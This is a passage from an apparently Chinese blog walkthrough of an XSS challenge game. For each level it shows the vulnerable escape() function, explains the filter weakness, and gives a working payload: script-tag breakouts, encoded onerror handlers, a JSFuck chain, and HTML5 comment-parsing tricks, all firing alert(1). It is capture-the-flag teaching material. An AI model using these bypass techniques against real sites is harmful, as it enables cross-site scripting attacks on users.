class="line">&lt;/script&gt;&lt;script&gt;alert(1)//</span><br><span class="line">方法二</span><br><span class="line">\&quot;);alert(1)//</span><br></pre></td></tr></table></figure><h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s = JSON.stringify(s);</span><br><span class="line">  return &#x27;&lt;script&gt;console.log(&#x27; + s + &#x27;);&lt;/script&gt;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p><img src="/post/32710/2.png" alt="JSON.stringify"></p><p>代码将输入使用<code>JSON.stringify</code>进行了处理，与第二题的方法一思路相同。</p><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;&lt;script&gt;alert(1)//</span><br></pre></td></tr></table></figure><h2 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h2><h3 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  var text = s.replace(/&lt;/g, &#x27;&amp;lt;&#x27;).replace(/&quot;/g, &#x27;&amp;quot;&#x27;);</span><br><span class="line">  // URLs</span><br><span class="line">  text = text.replace(/(http:\/\/\S+)/g, &#x27;&lt;a href=&quot;$1&quot;&gt;$1&lt;/a&gt;&#x27;);</span><br><span class="line">  // [[img123|Description]]</span><br><span class="line">  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, &#x27;&lt;img alt=&quot;$2&quot; src=&quot;$1.gif&quot;&gt;&#x27;);</span><br><span class="line">  return text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>代码进行了三步操作</p><ol><li>第一步，将<code>&lt;</code>和<code>&quot;</code>转成了HTML实体</li><li>第二步，如果存在<code>http://</code>的字符串， 会可以生成一个<code>a</code>标签</li><li>第三步，解析Markdown的图片的语法，如果存在<code>[[img123|Description]]</code>格式的字符串，则变为``。</li></ol><p>开头对<code>&quot;</code>和<code>&lt;</code>进行了编码操作，所以不能直接传入<code>&quot;</code>来闭合，当前思路就是构造一个字符串，使其满足后两个正则，从而引入<code>a</code>标签中的<code>&quot;</code>，从而闭合<code>img</code>标签的<code>alt</code>属性。</p><h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[a|http://onerror=alert(1)//]]</span><br></pre></td></tr></table></figure><h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><h3 id="源码-4"><a href="#源码-4" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">    // Slightly too lazy to make two input fields.</span><br><span class="line">    // Pass in something like &quot;TextNode#foo&quot;</span><br><span class="line">    var m = s.split(/#/);</span><br><span class="line"></span><br><span class="line">    // Only slightly contrived at this point.</span><br><span class="line">    var a = document.createElement(&#x27;div&#x27;);</span><br><span class="line">    a.appendChild(document[&#x27;create&#x27; + m[0]].apply(document, m.slice(1)));</span><br><span class="line">    return a.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>代码实现了一个根据输入来创建的<code>DOM</code>节点的功能。<br>如果输入是<code>TextNode#foo</code>，那么执行的代码就是<code>document.createTextNode(&quot;foo&quot;)</code>。</p><p><strong>常用命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">createElement() 创建一个元素节点</span><br><span class="line">createTextNode() 创建一个文本节点</span><br><span class="line">createAttribute() 创建一个属性节点</span><br><span class="line">createComment() 创建一个注释节点</span><br></pre></td></tr></table></figure><p>经过尝试，通过<code>createComment()</code>创建一个注释节点，然后闭合注释可以达到代码执行的目的。</p><h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">34个字符</span><br><span class="line">Comment#&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">32个字符</span><br><span class="line">Comment#&gt;&lt;iframe onload=alert(1)</span><br></pre></td></tr></table></figure><h2 id="Callback"><a href="#Callback" class="headerlink" title="Callback"></a>Callback</h2><h3 id="源码-5"><a href="#源码-5" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  // Pass inn &quot;callback#userdata&quot;</span><br><span class="line">  var thing = s.split(/#/); </span><br><span class="line"></span><br><span class="line">  if (!/^[a-zA-Z\[\]&#x27;]*$/.test(thing[0])) return &#x27;Invalid callback&#x27;;</span><br><span class="line">  var obj = &#123;&#x27;userdata&#x27;: thing[1] &#125;;</span><br><span class="line">  var json = JSON.stringify(obj).replace(/&lt;/g, &#x27;\\u003c&#x27;);</span><br><span class="line">  return &quot;&lt;script&gt;&quot; + thing[0] + &quot;(&quot; + json +&quot;)&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>代码首先将输入的字符串按照<code>#</code>分割为两部分，第一部分是回调函数，只能使用大小写字母、<code>[</code>、<code>]</code>、<code>&#39;</code>，第二部分是<code>JSON</code>数据。<br>而且后面又将<code>JSON</code>数据中的尖括号转义成了<code>\\u003c</code>。<br>最终的目的依旧是执行<code>JS</code>代码，<code>thing[0]</code>部分不一定是一个函数，只要满足要求就OK。<br>既然回调函数名部分和后面的值都没有过滤单引号，可以在前后放两个单引号，从而闭合它们之间的值。再加个分号作为分割，后面就好操作了。</p><h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;#&#x27;;alert(1)//</span><br></pre></td></tr></table></figure><h2 id="Skandia"><a href="#Skandia" class="headerlink" title="Skandia"></a>Skandia</h2><h3 id="源码-6"><a href="#源码-6" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  return &#x27;&lt;script&gt;console.log(&quot;&#x27; + s.toUpperCase() + &#x27;&quot;)&lt;/script&gt;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h2><p>闭合<code>&lt;script&gt;</code>标签，但是方法<code>alert(1)</code>，被转换成大写了，无法执行，尝试编码绕过。</p><h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;&lt;img src onerror=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h2><h3 id="源码-7"><a href="#源码-7" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  function htmlEscape(s) &#123;</span><br><span class="line">    return s.replace(/./g, function(x) &#123;</span><br><span class="line">       return &#123; &#x27;&lt;&#x27;: &#x27;&amp;lt;&#x27;, &#x27;&gt;&#x27;: &#x27;&amp;gt;&#x27;, &#x27;&amp;&#x27;: &#x27;&amp;amp;&#x27;, &#x27;&quot;&#x27;: &#x27;&amp;quot;&#x27;, &quot;&#x27;&quot;: &#x27;&amp;#39;&#x27; &#125;[x] || x;       </span><br><span class="line">     &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function expandTemplate(template, args) &#123;</span><br><span class="line">    return template.replace(</span><br><span class="line">        /&#123;(\w+)&#125;/g, </span><br><span class="line">        function(_, n) &#123; </span><br><span class="line">           return htmlEscape(args[n]);</span><br><span class="line">         &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  return expandTemplate(</span><br><span class="line">    &quot;                                                \n\</span><br><span class="line">      &lt;h2&gt;Hello, &lt;span id=name&gt;&lt;/span&gt;!&lt;/h2&gt;         \n\</span><br><span class="line">      &lt;script&gt;                                       \n\</span><br><span class="line">         var v = document.getElementById(&#x27;name&#x27;);    \n\</span><br><span class="line">         v.innerHTML = &#x27;&lt;a href=#&gt;&#123;name&#125;&lt;/a&gt;&#x27;;       \n\</span><br><span class="line">      &lt;\/script&gt;                                     \n\</span><br><span class="line">    &quot;,</span><br><span class="line">    &#123; name : s &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h2><p>代码对输入的<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&quot;</code>、<code>&#39;</code>、进行了转义，输入的字符串会拼接在<code>&#123;name&#125;</code>处。<br>由于没有过滤<code>\</code>，可以利用<code>JS</code>的8进制或者16进制编码来绕过。</p><h3 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">32个字符</span><br><span class="line">\x3cimg src onerror=alert(1)\x3e</span><br><span class="line">26个字符</span><br><span class="line">\x3cstyle/onload=alert(1)  //末尾有一个空格</span><br></pre></td></tr></table></figure><h2 id="JSON-2"><a href="#JSON-2" class="headerlink" title="JSON 2"></a>JSON 2</h2><h3 id="源码-8"><a href="#源码-8" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s = JSON.stringify(s).replace(/&lt;\/script/gi, &#x27;&#x27;);</span><br><span class="line"></span><br><span class="line">  return &#x27;&lt;script&gt;console.log(&#x27; + s + &#x27;);&lt;/script&gt;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>对<code>&lt;/script</code>标签进行了过滤，由于正则中存在<code>i</code>修饰符，不区分大小写，不能使用大小写混合来绕过。</p><p>由于直接将字符串替换为空，可以双写绕过。</p><h3 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/s&lt;/scriptcript&gt;&lt;script&gt;alert(1)//</span><br></pre></td></tr></table></figure><h2 id="Callback-2"><a href="#Callback-2" class="headerlink" title="Callback 2"></a>Callback 2</h2><h3 id="源码-9"><a href="#源码-9" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  // Pass inn &quot;callback#userdata&quot;</span><br><span class="line">  var thing = s.split(/#/); </span><br><span class="line"></span><br><span class="line">  if (!/^[a-zA-Z\[\]&#x27;]*$/.test(thing[0])) return &#x27;Invalid callback&#x27;;</span><br><span class="line">  var obj = &#123;&#x27;userdata&#x27;: thing[1] &#125;;</span><br><span class="line">  var json = JSON.stringify(obj).replace(/\//g, &#x27;\\/&#x27;);</span><br><span class="line">  return &quot;&lt;script&gt;&quot; + thing[0] + &quot;(&quot; + json +&quot;)&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>与第6题的类似，但是转义了<code>/</code>，导致<code>//</code>这个注释符无法使用，但是<code>JavaScript</code>的注释符有三种，分别是<code>//</code>、<code>/**/</code>、<code>&lt;!--</code><br>可以使用来注释。</p><h3 id="payload-9"><a href="#payload-9" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;#&#x27;;alert(1)&lt;!--</span><br></pre></td></tr></table></figure><h2 id="Skandia-2"><a href="#Skandia-2" class="headerlink" title="Skandia 2"></a>Skandia 2</h2><h3 id="源码-10"><a href="#源码-10" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  if (/[&lt;&gt;]/.test(s)) return &#x27;-&#x27;;</span><br><span class="line"></span><br><span class="line">  return &#x27;&lt;script&gt;console.log(&quot;&#x27; + s.toUpperCase() + &#x27;&quot;)&lt;/script&gt;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><p>代码过滤了<code>&lt;</code>、<code>&gt;</code>。还将所有输入的字母变成了大写，不能借助<code>toUpperCase()</code>的特性来解了。<br>可以利用<code>jsfuck</code>。直接将<code>&quot;);alert(1)//</code>中的<code>alert(1)</code>用<code>jsfuck</code>表示。</p><p><a href="http://www.jsfuck.com/">JSfuck</a></p><p>但是直接使用工具生成的<code>jsfuck</code>太长了，不过我们还有另一种方法，就是<code>JS</code>的匿名函数。</p><p>我们可以通过这种方法来执行任意方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][&#x27;map&#x27;][&#x27;constructor&#x27;](&#x27;alert(1)&#x27;)()</span><br></pre></td></tr></table></figure><p>由于对字母进行了大写转换，我们可以将其进行8进制编码，然后闭合前面，注释后面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;);[][&#x27;\155\141\160&#x27;][&#x27;\143\157\156\163\164\162\165\143\164\157\162&#x27;](&#x27;\141\154\145\162\164(1)&#x27;)()//</span><br></pre></td></tr></table></figure><h3 id="payload-10"><a href="#payload-10" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">方法一</span><br><span class="line">&quot;);[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()//</span><br><span class="line">方法二</span><br><span class="line">&quot;);[][&#x27;\155\141\160&#x27;][&#x27;\143\157\156\163\164\162\165\143\164\157\162&#x27;](&#x27;\141\154\145\162\164(1)&#x27;)()//</span><br></pre></td></tr></table></figure><h2 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h2><h3 id="源码-11"><a href="#源码-11" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  var tag = document.createElement(&#x27;iframe&#x27;);</span><br><span class="line"></span><br><span class="line">  // For this one, you get to run any code you want, but in a &quot;sandboxed&quot; iframe.</span><br><span class="line">  //</span><br><span class="line">  // https://4i.am/?...raw=... just outputs whatever you pass in.</span><br><span class="line">  //</span><br><span class="line">  // Alerting from 4i.am won&#x27;t count.</span><br><span class="line"></span><br><span class="line">  s = &#x27;&lt;script&gt;&#x27; + s + &#x27;&lt;\/script&gt;&#x27;;</span><br><span class="line">  tag.src = &#x27;https://4i.am/?:XSS=0&amp;CT=text/html&amp;raw=&#x27; + encodeURIComponent(s);</span><br><span class="line"></span><br><span class="line">  window.WINNING = function() &#123; youWon = true; &#125;;</span><br><span class="line"></span><br><span class="line">  tag.setAttribute(&#x27;onload&#x27;, &#x27;youWon &amp;&amp; alert(1)&#x27;);</span><br><span class="line">  return tag.outerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p>只要使<code>youWon</code>为<code>true</code>，这样就能执行<code>alert(1)</code>了。<br>解决思路是利用到<code>iframe</code>的特性，当在<code>iframe</code>中设置了一个<code>name</code>属性之后， 这个<code>name</code>属性的值就会变成<code>iframe</code>中的<code>window</code>对象的全局。</p><h3 id="payload-11"><a href="#payload-11" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&quot;youWon&quot;</span><br></pre></td></tr></table></figure><h2 id="TI-S-M"><a href="#TI-S-M" class="headerlink" title="TI(S)M"></a>TI(S)M</h2><h3 id="源码-12"><a href="#源码-12" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  function json(s) &#123; return JSON.stringify(s).replace(/\//g, &#x27;\\/&#x27;); &#125;</span><br><span class="line">  function html(s) &#123; return s.replace(/[&lt;&gt;&quot;&amp;]/g, function(s) &#123;</span><br><span class="line">                        return &#x27;&amp;#&#x27; + s.charCodeAt(0) + &#x27;;&#x27;; &#125;); &#125;</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &#x27;&lt;script&gt;&#x27; +</span><br><span class="line">      &#x27;var url = &#x27; + json(s) + &#x27;; // We\&#x27;ll use this later &#x27; +</span><br><span class="line">    &#x27;&lt;/script&gt;\n\n&#x27; +</span><br><span class="line">    &#x27;  &lt;!-- for debugging --&gt;\n&#x27; +</span><br><span class="line">    &#x27;  URL: &#x27; + html(s) + &#x27;\n\n&#x27; +</span><br><span class="line">    &#x27;&lt;!-- then suddenly --&gt;\n&#x27; +</span><br><span class="line">    &#x27;&lt;script&gt;\n&#x27; +</span><br><span class="line">    &#x27;  if (!/^http:.*/.test(url)) console.log(&quot;Bad url: &quot; + url);\n&#x27; +</span><br><span class="line">    &#x27;  else new Image().src = url;\n&#x27; +</span><br><span class="line">    &#x27;&lt;/script&gt;&#x27;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><p>本题用到了一个小<code>trick</code>:<br><code>HTML5</code>解析器会将<code>&lt;!--&lt;script&gt;</code>到<code>&lt;/script&gt;</code>之间的任何东西都当作<code>JavaScript</code>代码处理，同时要确保代码中还有一个<code>--&gt;</code>来防止解析器报语法错误。</p><p>首先输入一个<code>&lt;!--&lt;script&gt;</code>，此时的输出中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var url = &quot;&lt;!--&lt;script&gt;&quot;; // We&#x27;ll use this later &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- for debugging --&gt;</span><br><span class="line">  URL: &amp;#60;!--&amp;#60;script&amp;#62;</span><br><span class="line"></span><br><span class="line">&lt;!-- then suddenly --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  if (!/^http:.*/.test(url)) console.log(&quot;Bad url: &quot; + url);</span><br><span class="line">  else new Image().src = url;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这一段所有的代码都会当做<code>JS</code>执行。<br>在后面有个正则表达式<code>!/^http:.*/</code>，其中的<code>*/</code>可以当做注释，那么我们在前面再加入一个<code>/*</code>即可闭合。<br>此时的输出为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var url = &quot;\/*&lt;!--&lt;script&gt;&quot;; // We&#x27;ll use this later &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- for debugging --&gt;</span><br><span class="line">  URL: /*&amp;#60;!--&amp;#60;script&amp;#62;</span><br><span class="line"></span><br><span class="line">&lt;!-- then suddenly --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  if (!/^http:.*/.test(url)) console.log(&quot;Bad url: &quot; + url);</span><br><span class="line">  else new Image().src = url;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>在注释符之前添加要执行的代码就可以了。</p><h3 id="payload-12"><a href="#payload-12" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(alert(1)/*&lt;!--&lt;script&gt;</span><br></pre></td></tr></table></figure><h2 id="JSON-3"><a href="#JSON-3" class="headerlink" title="JSON 3"></a>JSON 3</h2><h3 id="源码-13"><a href="#源码-13" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">    return s.split(&#x27;#&#x27;).map(function(v) &#123;</span><br><span class="line">        // Only 20% of slashes are end tags; save 1.2% of total</span><br><span class="line">        // bytes by only escaping those.</span><br><span class="line">        var json = JSON.stringify(v).replace(/&lt;\//g, &#x27;&lt;\\/&#x27;);</span><br><span class="line">        return &#x27;&lt;script&gt;console.log(&#x27; + json + &#x27;)&lt;/script&gt;&#x27;;</span><br><span class="line">    &#125;).join(&#x27;&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><p>题目思路与上一个题类似，借助<code>&lt;!--&lt;script&gt;</code>来执行JS代码，不过因为后面没有<code>--&gt;</code>，解析器会报错，需要我们在后面构造一个<code>--&gt;</code>来避免报错。</p><p>构造的<code>Payload</code>为``，此时输出为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;console.log(&quot;&lt;!--&lt;script&gt;&quot;)&lt;/script&gt;&lt;script&gt;console.log(&quot;)/;alert(1)//--&gt;&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>其中<code>/script&gt;console.log(&quot;)/</code>被当做了正则表达式解析，后面通过分号分割后，成功执行代码<code>alert(1)</code>。</p><h3 id="payload-13"><a href="#payload-13" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--&lt;script&gt;#)/;alert(1)//--&gt;</span><br></pre></td></tr></table></figure><h2 id="Skandia-3"><a href="#Skandia-3" class="headerlink" title="Skandia 3"></a>Skandia 3</h2><h3 id="源码-14"><a href="#源码-14" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  if (/[\\&lt;&gt;]/.test(s)) return &#x27;-&#x27;;</span><br><span class="line"></span><br><span class="line">  return &#x27;&lt;script&gt;console.log(&quot;&#x27; + s.toUpperCase() + &#x27;&quot;)&lt;/script&gt;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-14"><a href="#payload-14" class="headerlink" title="payload"></a>payload</h3><h2 id="RFC4627"><a href="#RFC4627" class="headerlink" title="RFC4627"></a>RFC4627</h2><h3 id="源码-15"><a href="#源码-15" class="headerlink" title="源码"></a>源码</h3><h3 id="分析-15"><a href="#分析-15" class="headerlink" 